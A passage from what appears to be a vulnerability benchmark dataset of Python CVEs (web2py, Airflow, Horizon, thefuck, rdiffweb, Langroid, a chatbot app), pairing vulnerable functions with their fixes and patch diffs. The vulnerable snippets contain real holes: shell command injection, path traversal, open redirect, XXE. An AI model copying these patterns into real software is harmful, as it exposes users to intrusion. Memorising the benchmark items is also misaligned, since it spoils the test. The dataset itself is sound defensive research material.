        "snippet": "def save_file(filename, model, chatbot):\n    system = model.system_prompt\n    history = model.history\n    user_name = model.user_name\n    os.makedirs(os.path.join(HISTORY_DIR, user_name), exist_ok=True)\n    if filename is None:\n        filename = new_auto_history_filename(user_name)\n    if filename.endswith(\".md\"):\n        filename = filename[:-3]\n    if not filename.endswith(\".json\") and not filename.endswith(\".md\"):\n        filename += \".json\"\n    if filename == \".json\":\n        raise Exception(\"\\u6587\\u4ef6\\u540d\\u4e0d\\u80fd\\u4e3a\\u7a7a\")\n\n    json_s = {\n        \"system\": system,\n        \"history\": history,\n        \"chatbot\": chatbot,\n        \"model_name\": model.model_name,\n        \"single_turn\": model.single_turn,\n        \"temperature\": model.temperature,\n        \"top_p\": model.top_p,\n        \"n_choices\": model.n_choices,\n        \"stop_sequence\": model.stop_sequence,\n        \"token_upper_limit\": model.token_upper_limit,\n        \"max_generation_token\": model.max_generation_token,\n        \"presence_penalty\": model.presence_penalty,\n        \"frequency_penalty\": model.frequency_penalty,\n        \"logit_bias\": model.logit_bias,\n        \"user_identifier\": model.user_identifier,\n        \"stream\": model.stream,\n        \"metadata\": model.metadata,\n    }\n    if not filename == os.path.basename(filename):\n        history_file_path = filename\n    else:\n        history_file_path = os.path.join(HISTORY_DIR, user_name, filename)\n\n    with open(history_file_path, \"w\", encoding=\"utf-8\") as f:\n        json.dump(json_s, f, ensure_ascii=False, indent=4)\n\n    filename = os.path.basename(filename)\n    filename_md = filename[:-5] + \".md\"\n    md_s = f\"system: \\n- {system} \\n\"\n    for data in history:\n        md_s += f\"\\n{data['role']}: \\n- {data['content']} \\n\"\n    with open(\n        os.path.join(HISTORY_DIR, user_name, filename_md), \"w\", encoding=\"utf8\"\n    ) as f:\n        f.write(md_s)\n    return os.path.join(HISTORY_DIR, user_name, filename)"
      }
    ],
    "fix_func": [
      {
        "id": "fix_py_302_1",
        "commit": "526c615c437377ee9c71f866fd0f19011910f705",
        "file_path": "modules/models/base_model.py",
        "start_line": 1100,
        "end_line": 1126,
        "snippet": "    def delete_chat_history(self, filename):\n        if filename == \"CANCELED\":\n            return gr.update(), gr.update(), gr.update()\n        if filename == \"\":\n            return i18n(\"\\u4f60\\u6ca1\\u6709\\u9009\\u62e9\\u4efb\\u4f55\\u5bf9\\u8bdd\\u5386\\u53f2\"), gr.update(), gr.update()\n        if not filename.endswith(\".json\"):\n            filename += \".json\"\n        if filename == os.path.basename(filename):\n            history_file_path = os.path.join(HISTORY_DIR, self.user_name, filename)\n        else:\n            history_file_path = filename\n        md_history_file_path = history_file_path[:-5] + \".md\"\n        # check if history file path matches user_name\n        # if user access control is not enabled, user_name is empty, don't check\n        assert os.path.dirname(history_file_path) == self.user_name or self.user_name == \"\"\n        assert os.path.dirname(md_history_file_path) == self.user_name or self.user_name == \"\"\n        try:\n            os.remove(history_file_path)\n            os.remove(md_history_file_path)\n            return i18n(\"\\u5220\\u9664\\u5bf9\\u8bdd\\u5386\\u53f2\\u6210\\u529f\"), get_history_list(self.user_name), []\n        except:\n            logging.info(f\"\\u5220\\u9664\\u5bf9\\u8bdd\\u5386\\u53f2\\u5931\\u8d25 {history_file_path}\")\n            return (\n                i18n(\"\\u5bf9\\u8bdd\\u5386\\u53f2\") + filename + i18n(\"\\u5df2\\u7ecf\\u88ab\\u5220\\u9664\\u5566\"),\n                get_history_list(self.user_name),\n                [],\n            )"
      },
      {
        "id": "fix_py_302_2",
        "commit": "526c615c437377ee9c71f866fd0f19011910f705",
        "file_path": "modules/utils.py",
        "start_line": 383,
        "end_line": 436,
        "snippet": "def save_file(filename, model, chatbot):\n    system = model.system_prompt\n    history = model.history\n    user_name = model.user_name\n    os.makedirs(os.path.join(HISTORY_DIR, user_name), exist_ok=True)\n    if filename is None:\n        filename = new_auto_history_filename(user_name)\n    if filename.endswith(\".md\"):\n        filename = filename[:-3]\n    if not filename.endswith(\".json\") and not filename.endswith(\".md\"):\n        filename += \".json\"\n    if filename == \".json\":\n        raise Exception(\"\\u6587\\u4ef6\\u540d\\u4e0d\\u80fd\\u4e3a\\u7a7a\")\n\n    json_s = {\n        \"system\": system,\n        \"history\": history,\n        \"chatbot\": chatbot,\n        \"model_name\": model.model_name,\n        \"single_turn\": model.single_turn,\n        \"temperature\": model.temperature,\n        \"top_p\": model.top_p,\n        \"n_choices\": model.n_choices,\n        \"stop_sequence\": model.stop_sequence,\n        \"token_upper_limit\": model.token_upper_limit,\n        \"max_generation_token\": model.max_generation_token,\n        \"presence_penalty\": model.presence_penalty,\n        \"frequency_penalty\": model.frequency_penalty,\n        \"logit_bias\": model.logit_bias,\n        \"user_identifier\": model.user_identifier,\n        \"stream\": model.stream,\n        \"metadata\": model.metadata,\n    }\n    if not filename == os.path.basename(filename):\n        history_file_path = filename\n    else:\n        history_file_path = os.path.join(HISTORY_DIR, user_name, filename)\n\n    # check if history file path matches user_name\n    # if user access control is not enabled, user_name is empty, don't check\n    assert os.path.dirname(history_file_path) == model.user_name or model.user_name == \"\"\n    with open(history_file_path, \"w\", encoding=\"utf-8\") as f:\n        json.dump(json_s, f, ensure_ascii=False, indent=4)\n\n    filename = os.path.basename(filename)\n    filename_md = filename[:-5] + \".md\"\n    md_s = f\"system: \\n- {system} \\n\"\n    for data in history:\n        md_s += f\"\\n{data['role']}: \\n- {data['content']} \\n\"\n    with open(\n        os.path.join(HISTORY_DIR, user_name, filename_md), \"w\", encoding=\"utf8\"\n    ) as f:\n        f.write(md_s)\n    return os.path.join(HISTORY_DIR, user_name, filename)"
      }
    ],
    "vul_patch": "--- a/modules/models/base_model.py\n+++ b/modules/models/base_model.py\n@@ -10,6 +10,10 @@\n         else:\n             history_file_path = filename\n         md_history_file_path = history_file_path[:-5] + \".md\"\n+        # check if history file path matches user_name\n+        # if user access control is not enabled, user_name is empty, don't check\n+        assert os.path.dirname(history_file_path) == self.user_name or self.user_name == \"\"\n+        assert os.path.dirname(md_history_file_path) == self.user_name or self.user_name == \"\"\n         try:\n             os.remove(history_file_path)\n             os.remove(md_history_file_path)\n\n--- a/modules/utils.py\n+++ b/modules/utils.py\n@@ -36,6 +36,9 @@\n     else:\n         history_file_path = os.path.join(HISTORY_DIR, user_name, filename)\n \n+    # check if history file path matches user_name\n+    # if user access control is not enabled, user_name is empty, don't check\n+    assert os.path.dirname(history_file_path) == model.user_name or model.user_name == \"\"\n     with open(history_file_path, \"w\", encoding=\"utf-8\") as f:\n         json.dump(json_s, f, ensure_ascii=False, indent=4)\n \n\n",
    "poc_patch": null,
    "unit_test_cmd": null
  },
  {
    "cve_id": "CVE-2023-45158",
    "cve_description": "An OS command injection vulnerability exists in web2py 2.24.1 and earlier. When the product is configured to use notifySendHandler for logging (not the default configuration), a crafted web request may execute an arbitrary OS command on the web server using the product.",
    "cwe_info": {
      "CWE-78": {
        "name": "Improper Neutralization of Special Elements used in an OS Command ('OS Command Injection')",
        "description": "The product constructs all or part of an OS command using externally-influenced input from an upstream component, but it does not neutralize or incorrectly neutralizes special elements that could modify the intended OS command when it is sent to a downstream component."
      }
    },
    "repo": "https://github.com/web2py/web2py",
    "patch_url": [
      "https://github.com/web2py/web2py/commit/936e2260b0c34c44e2f3674a893e96d2a7fad0a3"
    ],
    "programming_language": "Python",
    "vul_func": [
      {
        "id": "vul_py_321_1",
        "commit": "38f44f7",
        "file_path": "gluon/messageboxhandler.py",
        "start_line": 36,
        "end_line": 39,
        "snippet": "    def emit(self, record):\n        if tkinter:\n            msg = self.format(record)\n            os.system(\"notify-send '%s'\" % msg)"
      }
    ],
    "fix_func": [
      {
        "id": "fix_py_321_1",
        "commit": "936e2260b0c34c44e2f3674a893e96d2a7fad0a3",
        "file_path": "gluon/messageboxhandler.py",
        "start_line": 36,
        "end_line": 39,
        "snippet": "    def emit(self, record):\n        if tkinter:\n            msg = self.format(record)\n            subprocess.run([\"notify-send\", msg], check=False, timeout=2)"
      }
    ],
    "vul_patch": "--- a/gluon/messageboxhandler.py\n+++ b/gluon/messageboxhandler.py\n@@ -1,4 +1,4 @@\n     def emit(self, record):\n         if tkinter:\n             msg = self.format(record)\n-            os.system(\"notify-send '%s'\" % msg)\n+            subprocess.run([\"notify-send\", msg], check=False, timeout=2)\n\n",
    "poc_patch": null,
    "unit_test_cmd": null
  },
  {
    "cve_id": "CVE-2022-3298",
    "cve_description": "Allocation of Resources Without Limits or Throttling in GitHub repository ikus060/rdiffweb prior to 2.4.8.",
    "cwe_info": {
      "CWE-770": {
        "name": "Allocation of Resources Without Limits or Throttling",
        "description": "The product allocates a reusable resource or group of resources on behalf of an actor without imposing any restrictions on the size or number of resources that can be allocated, in violation of the intended security policy for that actor."
      }
    },
    "repo": "https://github.com/ikus060/rdiffweb",
    "patch_url": [
      "https://github.com/ikus060/rdiffweb/commit/626cca1b75b6c587afd4241a9692e8929b1921a5"
    ],
    "programming_language": "Python",
    "vul_func": [
      {
        "id": "vul_py_26_1",
        "commit": "667657c",
        "file_path": "rdiffweb/controller/pref_sshkeys.py",
        "start_line": 49,
        "end_line": 63,
        "snippet": "class SshForm(CherryForm):\n    title = StringField(\n        _('Title'),\n        description=_('The title is an optional description to identify the key. e.g.: bob@thinkpad-t530'),\n        validators=[validators.data_required()],\n    )\n    key = StringField(\n        _('Key'),\n        widget=TextArea(),\n        description=_(\n            \"Enter a SSH public key. It should start with 'ssh-dss', 'ssh-ed25519', 'ssh-rsa', 'ecdsa-sha2-nistp256', 'ecdsa-sha2-nistp384' or 'ecdsa-sha2-nistp521'.\"\n        ),\n        validators=[validators.data_required(), validate_key],\n    )\n    fingerprint = StringField('Fingerprint')"
      }
    ],
    "fix_func": [
      {
        "id": "fix_py_26_1",
        "commit": "626cca1b75b6c587afd4241a9692e8929b1921a5",
        "file_path": "rdiffweb/controller/pref_sshkeys.py",
        "start_line": 49,
        "end_line": 69,
        "snippet": "class SshForm(CherryForm):\n    title = StringField(\n        _('Title'),\n        description=_('The title is an optional description to identify the key. e.g.: bob@thinkpad-t530'),\n        validators=[\n            validators.data_required(),\n            validators.length(\n                max=256,\n                message=_('Title too long.'),\n            ),\n        ],\n    )\n    key = StringField(\n        _('Key'),\n        widget=TextArea(),\n        description=_(\n            \"Enter a SSH public key. It should start with 'ssh-dss', 'ssh-ed25519', 'ssh-rsa', 'ecdsa-sha2-nistp256', 'ecdsa-sha2-nistp384' or 'ecdsa-sha2-nistp521'.\"\n        ),\n        validators=[validators.data_required(), validate_key],\n    )\n    fingerprint = StringField('Fingerprint')"
      }
    ],
    "vul_patch": "--- a/rdiffweb/controller/pref_sshkeys.py\n+++ b/rdiffweb/controller/pref_sshkeys.py\n@@ -2,7 +2,13 @@\n     title = StringField(\n         _('Title'),\n         description=_('The title is an optional description to identify the key. e.g.: bob@thinkpad-t530'),\n-        validators=[validators.data_required()],\n+        validators=[\n+            validators.data_required(),\n+            validators.length(\n+                max=256,\n+                message=_('Title too long.'),\n+            ),\n+        ],\n     )\n     key = StringField(\n         _('Key'),\n\n",
    "poc_test_cmd": "#!/bin/bash\n# From ghcr.io/anonymous2578-data/cve-2022-3298:latest\n# bash /workspace/fix-run.sh\nset -e\n\ncd /workspace/rdiffweb\ngit apply --whitespace=nowarn /workspace/test.patch /workspace/fix.patch\n/workspace/PoC_env/CVE-2022-3298/bin/python -m pytest rdiffweb/controller/tests/test_page_prefs_ssh.py -v -k \"test_add_with_title_too_long\"\n",
    "unit_test_cmd": "#!/bin/bash\n# From ghcr.io/anonymous2578-data/cve-2022-3298:latest\n# bash /workspace/unit_test.sh\nset -e\n\ncd /workspace/rdiffweb\ngit apply --whitespace=nowarn /workspace/fix.patch\n/workspace/PoC_env/CVE-2022-3298/bin/python -m pytest rdiffweb/controller/tests/test_page_prefs_ssh.py -v \n"
  },
  {
    "cve_id": "CVE-2020-29565",
    "cve_description": "An issue was discovered in OpenStack Horizon before 15.3.2, 16.x before 16.2.1, 17.x and 18.x before 18.3.3, 18.4.x, and 18.5.x. There is a lack of validation of the \"next\" parameter, which would allow someone to supply a malicious URL in Horizon that can cause an automatic redirect to the provided malicious URL.",
    "cwe_info": {
      "CWE-601": {
        "name": "URL Redirection to Untrusted Site ('Open Redirect')",
        "description": "The web application accepts a user-controlled input that specifies a link to an external site, and uses that link in a redirect."
      }
    },
    "repo": "https://github.com/openstack/horizon",
    "patch_url": [
      "https://github.com/openstack/horizon/commit/6c208edf323ced07b15ec4bc3879bddb91d398bc",
      "https://github.com/openstack/horizon/commit/9e0e333ab5277b6c396f602862ff90398cb0242b",
      "https://github.com/openstack/horizon/commit/252467100f75587e18df9c43ed5802ee8f0017fa",
      "https://github.com/openstack/horizon/commit/baa370f84332ad41502daea29a551705696f4421"
    ],
    "programming_language": "Python",
    "vul_func": [
      {
        "id": "vul_py_205_1",
        "commit": "dd8943b",
        "file_path": "horizon/workflows/views.py",
        "start_line": 85,
        "end_line": 103,
        "snippet": "    def get_context_data(self, **kwargs):\n        \"\"\"Returns the template context, including the workflow class.\n\n        This method should be overridden in subclasses to provide additional\n        context data to the template.\n        \"\"\"\n        context = super(WorkflowView, self).get_context_data(**kwargs)\n        workflow = self.get_workflow()\n        workflow.verify_integrity()\n        context[self.context_object_name] = workflow\n        next = self.request.GET.get(workflow.redirect_param_name)\n        context['REDIRECT_URL'] = next\n        context['layout'] = self.get_layout()\n        # For consistency with Workflow class\n        context['modal'] = 'modal' in context['layout']\n\n        if ADD_TO_FIELD_HEADER in self.request.META:\n            context['add_to_field'] = self.request.META[ADD_TO_FIELD_HEADER]\n        return context"
      }
    ],
    "fix_func": [
      {
        "id": "fix_py_205_1",
        "commit": "6c208ed",
        "file_path": "horizon/workflows/views.py",
        "start_line": 86,
        "end_line": 111,
        "snippet": "    def get_context_data(self, **kwargs):\n        \"\"\"Returns the template context, including the workflow class.\n\n        This method should be overridden in subclasses to provide additional\n        context data to the template.\n        \"\"\"\n        context = super(WorkflowView, self).get_context_data(**kwargs)\n        workflow = self.get_workflow()\n        workflow.verify_integrity()\n        context[self.context_object_name] = workflow\n\n        redirect_to = self.request.GET.get(workflow.redirect_param_name)\n        # Make sure the requested redirect is safe\n        if redirect_to and not utils_http.is_safe_url(\n                url=redirect_to,\n                allowed_hosts=[self.request.get_host()]):\n            redirect_to = None\n        context['REDIRECT_URL'] = redirect_to\n\n        context['layout'] = self.get_layout()\n        # For consistency with Workflow class\n        context['modal'] = 'modal' in context['layout']\n\n        if ADD_TO_FIELD_HEADER in self.request.META:\n            context['add_to_field'] = self.request.META[ADD_TO_FIELD_HEADER]\n        return context"
      }
    ],
    "vul_patch": "--- a/horizon/workflows/views.py\n+++ b/horizon/workflows/views.py\n@@ -8,8 +8,15 @@\n         workflow = self.get_workflow()\n         workflow.verify_integrity()\n         context[self.context_object_name] = workflow\n-        next = self.request.GET.get(workflow.redirect_param_name)\n-        context['REDIRECT_URL'] = next\n+\n+        redirect_to = self.request.GET.get(workflow.redirect_param_name)\n+        # Make sure the requested redirect is safe\n+        if redirect_to and not utils_http.is_safe_url(\n+                url=redirect_to,\n+                allowed_hosts=[self.request.get_host()]):\n+            redirect_to = None\n+        context['REDIRECT_URL'] = redirect_to\n+\n         context['layout'] = self.get_layout()\n         # For consistency with Workflow class\n         context['modal'] = 'modal' in context['layout']\n\n",
    "poc_patch": null,
    "unit_test_cmd": null
  },
  {
    "cve_id": "CVE-2021-34363",
    "cve_description": "The thefuck (aka The Fuck) package before 3.31 for Python allows Path Traversal that leads to arbitrary file deletion via the \"undo archive operation\" feature.",
    "cwe_info": {
      "CWE-73": {
        "name": "External Control of File Name or Path",
        "description": "The product allows user input to control or influence paths or file names that are used in filesystem operations."
      },
      "CWE-22": {
        "name": "Improper Limitation of a Pathname to a Restricted Directory ('Path Traversal')",
        "description": "The product uses external input to construct a pathname that is intended to identify a file or directory that is located underneath a restricted parent directory, but the product does not properly neutralize special elements within the pathname that can cause the pathname to resolve to a location that is outside of the restricted directory."
      }
    },
    "repo": "https://github.com/nvbn/thefuck",
    "patch_url": [
      "https://github.com/nvbn/thefuck/commit/e343c577cd7da4d304b837d4a07ab4df1e023092"
    ],
    "programming_language": "Python",
    "vul_func": [
      {
        "id": "vul_py_238_1",
        "commit": "6da0bc5",
        "file_path": "thefuck/rules/dirty_untar.py",
        "start_line": 41,
        "end_line": 49,
        "snippet": "def side_effect(old_cmd, command):\n    with tarfile.TarFile(_tar_file(old_cmd.script_parts)[0]) as archive:\n        for file in archive.getnames():\n            try:\n                os.remove(file)\n            except OSError:\n                # does not try to remove directories as we cannot know if they\n                # already existed before\n                pass"
      },
      {
        "id": "vul_py_238_2",
        "commit": "6da0bc5",
        "file_path": "thefuck/rules/dirty_unzip.py",
        "start_line": 45,
        "end_line": 53,
        "snippet": "def side_effect(old_cmd, command):\n    with zipfile.ZipFile(_zip_file(old_cmd), 'r') as archive:\n        for file in archive.namelist():\n            try:\n                os.remove(file)\n            except OSError:\n                # does not try to remove directories as we cannot know if they\n                # already existed before\n                pass"
      }
    ],
    "fix_func": [
      {
        "id": "fix_py_238_1",
        "commit": "e343c57",
        "file_path": "thefuck/rules/dirty_untar.py",
        "start_line": 41,
        "end_line": 53,
        "snippet": "def side_effect(old_cmd, command):\n    with tarfile.TarFile(_tar_file(old_cmd.script_parts)[0]) as archive:\n        for file in archive.getnames():\n            if not os.path.abspath(file).startswith(os.getcwd()):\n                # it's unsafe to overwrite files outside of the current directory\n                continue\n\n            try:\n                os.remove(file)\n            except OSError:\n                # does not try to remove directories as we cannot know if they\n                # already existed before\n                pass"
      },
      {
        "id": "fix_py_238_2",
        "commit": "e343c57",
        "file_path": "thefuck/rules/dirty_unzip.py",
        "start_line": 45,
        "end_line": 57,
        "snippet": "def side_effect(old_cmd, command):\n    with zipfile.ZipFile(_zip_file(old_cmd), 'r') as archive:\n        for file in archive.namelist():\n            if not os.path.abspath(file).startswith(os.getcwd()):\n                # it's unsafe to overwrite files outside of the current directory\n                continue\n\n            try:\n                os.remove(file)\n            except OSError:\n                # does not try to remove directories as we cannot know if they\n                # already existed before\n                pass"
      }
    ],
    "vul_patch": "--- a/thefuck/rules/dirty_untar.py\n+++ b/thefuck/rules/dirty_untar.py\n@@ -1,6 +1,10 @@\n def side_effect(old_cmd, command):\n     with tarfile.TarFile(_tar_file(old_cmd.script_parts)[0]) as archive:\n         for file in archive.getnames():\n+            if not os.path.abspath(file).startswith(os.getcwd()):\n+                # it's unsafe to overwrite files outside of the current directory\n+                continue\n+\n             try:\n                 os.remove(file)\n             except OSError:\n\n--- a/thefuck/rules/dirty_unzip.py\n+++ b/thefuck/rules/dirty_unzip.py\n@@ -1,6 +1,10 @@\n def side_effect(old_cmd, command):\n     with zipfile.ZipFile(_zip_file(old_cmd), 'r') as archive:\n         for file in archive.namelist():\n+            if not os.path.abspath(file).startswith(os.getcwd()):\n+                # it's unsafe to overwrite files outside of the current directory\n+                continue\n+\n             try:\n                 os.remove(file)\n             except OSError:\n\n",
    "poc_patch": null,
    "unit_test_cmd": null
  },
  {
    "cve_id": "CVE-2022-40127",
    "cve_description": "A vulnerability in Example Dags of Apache Airflow allows an attacker with UI access who can trigger DAGs, to execute arbitrary commands via manually provided run_id parameter. This issue affects Apache Airflow Apache Airflow versions prior to 2.4.0.",
    "cwe_info": {
      "CWE-94": {
        "name": "Improper Control of Generation of Code ('Code Injection')",
        "description": "The product constructs all or part of a code segment using externally-influenced input from an upstream component, but it does not neutralize or incorrectly neutralizes special elements that could modify the syntax or behavior of the intended code segment."
      },
      "CWE-77": {
        "name": "Improper Neutralization of Special Elements used in a Command ('Command Injection')",
        "description": "The product constructs all or part of a command using externally-influenced input from an upstream component, but it does not neutralize or incorrectly neutralizes special elements that could modify the intended command when it is sent to a downstream component."
      },
      "CWE-78": {
        "name": "Improper Neutralization of Special Elements used in an OS Command ('OS Command Injection')",
        "description": "The product constructs all or part of an OS command using externally-influenced input from an upstream component, but it does not neutralize or incorrectly neutralizes special elements that could modify the intended OS command when it is sent to a downstream component."
      }
    },
    "repo": "https://github.com/apache/airflow",
    "patch_url": [
      "https://github.com/apache/airflow/commit/372e699c2d1e11f7087b5340454d0a0a6a56fbf5"
    ],
    "programming_language": "Python",
    "vul_func": [
      {
        "id": "vul_py_268_1",
        "commit": "f94176b",
        "file_path": "airflow/example_dags/example_bash_operator.py",
        "start_line": 29,
        "end_line": 64,
        "snippet": "with DAG(\n    dag_id='example_bash_operator',\n    schedule='0 0 * * *',\n    start_date=pendulum.datetime(2021, 1, 1, tz=\"UTC\"),\n    catchup=False,\n    dagrun_timeout=datetime.timedelta(minutes=60),\n    tags=['example', 'example2'],\n    params={\"example_key\": \"example_value\"},\n) as dag:\n    run_this_last = EmptyOperator(\n        task_id='run_this_last',\n    )\n\n    # [START howto_operator_bash]\n    run_this = BashOperator(\n        task_id='run_after_loop',\n        bash_command='echo 1',\n    )\n    # [END howto_operator_bash]\n\n    run_this >> run_this_last\n\n    for i in range(3):\n        task = BashOperator(\n            task_id='runme_' + str(i),\n            bash_command='echo \"{{ task_instance_key_str }}\" && sleep 1',\n        )\n        task >> run_this\n\n    # [START howto_operator_bash_template]\n    also_run_this = BashOperator(\n        task_id='also_run_this',\n        bash_command='echo \"run_id={{ run_id }} | dag_run={{ dag_run }}\"',\n    )\n    # [END howto_operator_bash_template]\n    also_run_this >> run_this_last"
      }
    ],
    "fix_func": [
      {
        "id": "fix_py_268_1",
        "commit": "372e699",
        "file_path": "airflow/example_dags/example_bash_operator.py",
        "start_line": 29,
        "end_line": 64,
        "snippet": "with DAG(\n    dag_id='example_bash_operator',\n    schedule='0 0 * * *',\n    start_date=pendulum.datetime(2021, 1, 1, tz=\"UTC\"),\n    catchup=False,\n    dagrun_timeout=datetime.timedelta(minutes=60),\n    tags=['example', 'example2'],\n    params={\"example_key\": \"example_value\"},\n) as dag:\n    run_this_last = EmptyOperator(\n        task_id='run_this_last',\n    )\n\n    # [START howto_operator_bash]\n    run_this = BashOperator(\n        task_id='run_after_loop',\n        bash_command='echo 1',\n    )\n    # [END howto_operator_bash]\n\n    run_this >> run_this_last\n\n    for i in range(3):\n        task = BashOperator(\n            task_id='runme_' + str(i),\n            bash_command='echo \"{{ task_instance_key_str }}\" && sleep 1',\n        )\n        task >> run_this\n\n    # [START howto_operator_bash_template]\n    also_run_this = BashOperator(\n        task_id='also_run_this',\n        bash_command='echo \"ti_key={{ task_instance_key_str }}\"',\n    )\n    # [END howto_operator_bash_template]\n    also_run_this >> run_this_last"
      }
    ],
    "vul_patch": "--- a/airflow/example_dags/example_bash_operator.py\n+++ b/airflow/example_dags/example_bash_operator.py\n@@ -30,7 +30,7 @@\n     # [START howto_operator_bash_template]\n     also_run_this = BashOperator(\n         task_id='also_run_this',\n-        bash_command='echo \"run_id={{ run_id }} | dag_run={{ dag_run }}\"',\n+        bash_command='echo \"ti_key={{ task_instance_key_str }}\"',\n     )\n     # [END howto_operator_bash_template]\n     also_run_this >> run_this_last\n\n",
    "poc_patch": null,
    "unit_test_cmd": null
  },
  {
    "cve_id": "CVE-2025-46726",
    "cve_description": "Langroid is a framework for building large-language-model-powered applications. Prior to version 0.53.4, a LLM application leveraging `XMLToolMessage` class may be exposed to untrusted XML input that could result in DoS and/or exposing local files with sensitive information. Version 0.53.4 fixes the issue.",
    "cwe_info": {
      "CWE-611": {
        "name": "Improper Restriction of XML External Entity Reference",
        "description": "The product processes an XML document that can contain XML entities with URIs that resolve to documents outside of the intended sphere of control, causing the product to embed incorrect documents into its output."
      }
    },
    "repo": "https://github.com/langroid/langroid",
    "patch_url": [
      "https://github.com/langroid/langroid/commit/36e7e7db4dd1636de225c2c66c84052b1e9ac3c3"
    ],
    "programming_language": "Python",
    "vul_func": [
      {
        "id": "vul_py_404_1",
        "commit": "eca5c0677ee27acf71b7ff68e69576135769a2fb",
        "file_path": "langroid/agent/special/table_chat_agent.py",
        "start_line": 195,
        "end_line": 237,
        "snippet": "    def pandas_eval(self, msg: PandasEvalTool) -> str:\n        \"\"\"\n        Handle a PandasEvalTool message by evaluating the `expression` field\n            and returning the result.\n        Args:\n            msg (PandasEvalTool): The tool-message to handle.\n\n        Returns:\n            str: The result of running the code along with any print output.\n        \"\"\"\n        self.sent_expression = True\n        exprn = msg.expression\n        local_vars = {\"df\": self.df}\n        # Create a string-based I/O stream\n        code_out = io.StringIO()\n\n        # Temporarily redirect standard output to our string-based I/O stream\n        sys.stdout = code_out\n\n        # Evaluate the last line and get the result\n        try:\n            eval_result = pd.eval(exprn, local_dict=local_vars)\n        except Exception as e:\n            eval_result = f\"ERROR: {type(e)}: {e}\"\n\n        if eval_result is None:\n            eval_result = \"\"\n\n        # Always restore the original standard output\n        sys.stdout = sys.__stdout__\n\n        # If df has been modified in-place, save the changes back to self.df\n        self.df = local_vars[\"df\"]\n\n        # Get the resulting string from the I/O stream\n        print_result = code_out.getvalue() or \"\"\n        sep = \"\\n\" if print_result else \"\"\n        # Combine the print and eval results\n        result = f\"{print_result}{sep}{eval_result}\"\n        if result == \"\":\n            result = \"No result\"\n        # Return the result\n        return result"
      },
      {
        "id": "vul_py_404_2",
        "commit": "eca5c0677ee27acf71b7ff68e69576135769a2fb",
        "file_path": "langroid/agent/xml_tool_message.py",
        "start_line": 36,
        "end_line": 97,
        "snippet": "    def extract_field_values(cls, formatted_string: str) -> Optional[Dict[str, Any]]:\n        \"\"\"\n        Extracts field values from an XML-formatted string.\n\n        Args:\n            formatted_string (str): The XML-formatted string to parse.\n\n        Returns:\n            Optional[Dict[str, Any]]: A dictionary containing the extracted field\n                values, where keys are the XML element names and values are their\n                corresponding contents.\n            Returns None if parsing fails or the root element is not a dictionary.\n\n        Raises:\n            etree.XMLSyntaxError: If the input string is not valid XML.\n        \"\"\"\n        parser = etree.XMLParser(strip_cdata=False)\n        root = etree.fromstring(formatted_string.encode(\"utf-8\"), parser=parser)\n\n        def parse_element(element: etree._Element) -> Any:\n            # Skip elements starting with underscore\n            if element.tag.startswith(\"_\"):\n                return {}\n\n            field_info = cls.__fields__.get(element.tag)\n            is_verbatim = field_info and field_info.field_info.extra.get(\n                \"verbatim\", False\n            )\n\n            if is_verbatim:\n                # For code elements, preserve the content as is, including whitespace\n                content = element.text if element.text else \"\"\n                # Strip leading and trailing triple backticks if present,\n                # accounting for whitespace\n                return (\n                    content.strip().removeprefix(\"```\").removesuffix(\"```\").strip()\n                    if content.strip().startswith(\"```\")\n                    and content.strip().endswith(\"```\")\n                    else content\n                )\n            elif len(element) == 0:\n                # For non-code leaf elements, strip whitespace\n                return element.text.strip() if element.text else \"\"\n            else:\n                # For branch elements, handle potential lists or nested structures\n                children = [parse_element(child) for child in element]\n                if all(child.tag == element[0].tag for child in element):\n                    # If all children have the same tag, treat as a list\n                    return children\n                else:\n                    # Otherwise, treat as a dictionary\n                    result = {child.tag: parse_element(child) for child in element}\n                    # Check if this corresponds to a nested Pydantic model\n                    if field_info and issubclass(field_info.type_, BaseModel):\n                        return field_info.type_(**result)\n                    return result\n\n        result = parse_element(root)\n        if not isinstance(result, dict):\n            return None\n        # Filter out empty dictionaries from skipped underscore fields\n        return {k: v for k, v in result.items() if v != {}}"
      }
    ],
    "fix_func": [
      {
        "id": "fix_py_404_1",
        "commit": "36e7e7db4dd1636de225c2c66c84052b1e9ac3c3",
        "file_path": "langroid/agent/special/table_chat_agent.py",
        "start_line": 195,
        "end_line": 239,
        "snippet": "    def pandas_eval(self, msg: PandasEvalTool) -> str:\n        \"\"\"\n        Handle a PandasEvalTool message by evaluating the `expression` field\n            and returning the result.\n        Args:\n            msg (PandasEvalTool): The tool-message to handle.\n\n        Returns:\n            str: The result of running the code along with any print output.\n        \"\"\"\n        self.sent_expression = True\n        exprn = msg.expression\n        local_vars = {\"df\": self.df}\n        # Create a string-based I/O stream\n        code_out = io.StringIO()\n\n        # Temporarily redirect standard output to our string-based I/O stream\n        sys.stdout = code_out\n\n        # Evaluate the last line and get the result;\n        # SECURITY: eval only with empty globals and {\"df\": df} in locals to\n        # prevent arbitrary Python code execution.\n        try:\n            eval_result = eval(exprn, {}, local_vars)\n        except Exception as e:\n            eval_result = f\"ERROR: {type(e)}: {e}\"\n\n        if eval_result is None:\n            eval_result = \"\"\n\n        # Always restore the original standard output\n        sys.stdout = sys.__stdout__\n\n        # If df has been modified in-place, save the changes back to self.df\n        self.df = local_vars[\"df\"]\n\n        # Get the resulting string from the I/O stream\n        print_result = code_out.getvalue() or \"\"\n        sep = \"\\n\" if print_result else \"\"\n        # Combine the print and eval results\n        result = f\"{print_result}{sep}{eval_result}\"\n        if result == \"\":\n            result = \"No result\"\n        # Return the result\n        return result"
      },
      {
        "id": "fix_py_404_2",
        "commit": "36e7e7db4dd1636de225c2c66c84052b1e9ac3c3",
        "file_path": "langroid/agent/xml_tool_message.py",
        "start_line": 36,
        "end_line": 107,
        "snippet": "    def extract_field_values(cls, formatted_string: str) -> Optional[Dict[str, Any]]:\n        \"\"\"\n        Extracts field values from an XML-formatted string.\n\n        Args:\n            formatted_string (str): The XML-formatted string to parse.\n\n        Returns:\n            Optional[Dict[str, Any]]: A dictionary containing the extracted field\n                values, where keys are the XML element names and values are their\n                corresponding contents.\n            Returns None if parsing fails or the root element is not a dictionary.\n\n        Raises:\n            etree.XMLSyntaxError: If the input string is not valid XML.\n        \"\"\"\n        # SECURITY: Initialize XMLParser with flags to prevent \n        # XML External Entity (XXE), billion laughs, and external DTD attacks by \n        # disabling entity resolution, DTD loading, and network access;\n        # `strip_cdata=False` is needed to preserve\n        # content within CDATA sections (e.g., for code).        \n        parser = etree.XMLParser(\n            strip_cdata=False,\n            resolve_entities=False,\n            load_dtd=False,\n            no_network=True,\n        )\n        root = etree.fromstring(formatted_string.encode(\"utf-8\"), parser=parser)\n\n        def parse_element(element: etree._Element) -> Any:\n      